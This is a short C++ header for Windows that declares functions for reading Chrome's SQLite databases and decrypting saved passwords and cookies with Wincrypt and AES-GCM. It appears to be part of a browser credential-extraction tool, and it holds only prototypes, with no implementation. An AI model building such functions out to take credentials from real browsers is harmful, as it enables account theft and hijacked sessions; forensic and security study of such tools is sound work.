#ifndef SQLFUNCTIONS_H
#define SQLFUNCTIONS_H

/* Standard Header Files*/
#include <windows.h>
#include <Wincrypt.h>
#include <tchar.h>
#include <sstream>
#include <iostream>
#include <vector>
#include <string>
#include <vector>

/* Libraries */
#include "sqlite3.h"
#include "../nlohmann/json.hpp"

using json = nlohmann::json;

/* Header files of Implementations */
#include "aes_gcm.h"

std::string hexStr(const uint8_t *, int);
BYTE * getPassword(BYTE *, BYTE *, DWORD);
std::stringstream get_chrome_pass(BYTE *, sqlite3*);
json getAllResults(const char * temp);
json getAllCookies(const char * temp);

#endif